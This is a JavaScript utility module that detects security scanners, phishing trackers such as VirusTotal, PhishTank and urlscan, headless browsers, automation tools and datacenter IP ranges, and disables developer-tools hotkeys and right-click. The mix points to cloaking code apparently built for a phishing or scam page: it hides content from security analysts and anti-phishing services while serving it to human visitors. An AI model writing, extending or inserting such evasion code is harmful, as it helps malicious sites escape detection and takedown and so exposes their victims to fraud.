// Anti-Bot & Scanner Detection Utility

const BOT_USER_AGENTS = [
  'googlebot',
  'bingbot',
  'slurp',
  'duckduckbot',
  'baiduspider',
  'yandexbot',
  'sogou',
  'exabot',
  'facebot',
  'ia_archiver',
  'netcraft',
  'virustotal',
  'paloalto',
  'zscaler',
  'phishtank',
  'urlscan',
  'trendmicro',
  'fortinet',
  'cisco',
  'python',
  'curl',
  'wget',
  'scrapy',
  'phantom',
  'headlesschrome',
  'puppeteer',
  'playwright',
  'selenium',
  'httpclient',
  'go-http-client',
  'postman',
  'insomnia',
  'node-fetch',
  'axios',
  'apache-httpclient'
];

const DATACENTER_KEYWORDS = [
  'amazon',
  'aws',
  'google',
  'gcp',
  'microsoft',
  'azure',
  'digitalocean',
  'linode',
  'hetzner',
  'ovh',
  'palo alto',
  'zscaler',
  'cloudflare',
  'fastly',
  'akamai',
  'leaseweb',
  'vultr',
  'hostinger',
  'choopa',
  'datacenter',
  'hosting',
  'cloud',
  'server',
  'm247'
];

/**
 * Check if the User-Agent belongs to a known bot or security scanner
 */
export function isBotUserAgent() {
  const ua = (typeof navigator !== 'undefined' ? navigator.userAgent : '').toLowerCase();
  return BOT_USER_AGENTS.some((bot) => ua.includes(bot));
}

/**
 * Detect headless browsers and automated test tools
 */
export function isHeadlessOrAutomated() {
  if (typeof window === 'undefined') return true;

  // Pre-hydration inline detection check
  if (window.__IS_BOT_DETECTED__) return true;

  // WebDriver check
  if (navigator.webdriver) return true;

  // Known automation properties injected by tools
  const automationProps = [
    'Cypress',
    'callPhantom',
    '_phantom',
    '__nightmare',
    'domAutomation',
    'domAutomationController',
    '__selenium_evaluate',
    '__webdriver_evaluate',
    '__driver_evaluate',
    '__webdriver_script_function',
    '__webdriver_script_func',
    '__webdriver_script_entry_cost',
    '__fxdriver_evaluate',
    '__driver_unwrapped',
    '__webdriver_unwrapped',
    '__selenium_unwrapped',
    '__fxdriver_unwrapped'
  ];

  for (const prop of automationProps) {
    if (prop in window || prop in document) {
      return true;
    }
  }

  // Check missing languages
  if (!navigator.languages || navigator.languages.length === 0) {
    return true;
  }

  // Check window outer dimensions
  if (window.outerWidth === 0 && window.outerHeight === 0) {
    return true;
  }

  // Check plugin count for non-mobile Chrome
  const isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
  const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
  if (isChrome && !isMobile && (!navigator.plugins || navigator.plugins.length === 0)) {
    return true;
  }

  return false;
}

/**
 * Asynchronously check if visitor IP belongs to a datacenter / cloud scanner
 */
export async function checkDatacenterIP() {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);

    const res = await fetch('https://ipapi.co/json/', {
      signal: controller.signal
    });
    clearTimeout(timeoutId);

    if (!res.ok) return false;

    const data = await res.json();
    const org = (data.org || data.asn || data.isp || '').toLowerCase();

    return DATACENTER_KEYWORDS.some((kw) => org.includes(kw));
  } catch {
    // If API fails or times out, allow normal traffic
    return false;
  }
}

/**
 * Setup anti-analysis features (Disable F12, Ctrl+U, Right Click)
 */
export function initAntiDevtools({ disableRightClick = false, disableHotkeys = true } = {}) {
  if (typeof window === 'undefined') return;

  if (disableRightClick) {
    document.addEventListener('contextmenu', (e) => e.preventDefault());
  }

  if (disableHotkeys) {
    document.addEventListener('keydown', (e) => {
      // F12 key
      if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
      }
      // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U, Ctrl+S
      if (
        (e.ctrlKey || e.metaKey) &&
        (e.shiftKey
          ? ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)
          : ['U', 'S', 'u', 's'].includes(e.key))
      ) {
        e.preventDefault();
        return false;
      }
    });
  }
}
